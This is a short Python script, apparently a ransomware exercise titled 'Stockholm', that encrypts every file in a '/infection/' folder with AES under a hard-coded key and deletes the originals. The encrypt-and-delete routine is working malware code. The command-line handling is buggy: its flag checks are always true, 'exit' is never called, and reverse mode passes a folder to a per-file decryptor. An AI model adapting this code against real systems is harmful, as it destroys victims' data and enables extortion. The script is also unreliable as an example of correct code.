import os
import glob
from Crypto.Cipher import AES
import sys
KEY = b'password42424242'
SILENT = 0
path = '/infection/'

def doDir(directory, flag):
    pattern = os.path.join(directory, '*')
    files = glob.glob(pattern)
    
    for file in files:
        if flag == 0:
            encryptFile(file)
        else:
            reverseEncrypt(file)

def encryptFile(file):
    with open(file, 'rb') as fileR:
        plain = fileR.read()
    cipher = AES.new(KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(plain)
    encryptFilePath = file + '.ft'
    with open(encryptFilePath, 'wb') as encryptedFile:
        [encryptedFile.write(x) for x in (cipher.nonce, tag, ciphertext)]
    os.remove(file)
    if SILENT == 0:
        print("File", file, "encrypted")

def reverseEncrypt(file):
    with open(file, 'rb') as encryptedFile:
        nonce, tag, ciphertext = [encryptedFile.read(x) for x in (16, 16, -1)]
        
    cipher = AES.new(KEY, AES.MODE_EAX, nonce)
    plain = cipher.decrypt_and_verify(ciphertext, tag)
    decryptedFileName = file[:-3]
    with open(decryptedFileName, 'wb') as decryptedFile:
        decryptedFile.write(plain)
    os.remove(file)
    if SILENT == 0:
        print("File", file, "decrypted")
    
    
    
def help():
    print("Use -help or -h to show this message")
    print("Use -version or -v to show program version")
    print("Use -reverse or -r to revert the encryption")
    print("Use -silent or -s to avoid printing the files that are being encrypted")


if __name__ == '__main__':
    global SILENT
    for argu in sys.argv[1:]:
        if argu == '-help' or '-h':
            help()
        if argu == '-version' or '-v':
            print ("Stockholm v0 by mvillaes")
        if argu == '-reverse' or '-r':
            reverseEncrypt(path)
            exit
        if argu == '-silent' or '-s':
            SILENT = 1
    doDir(path, 0)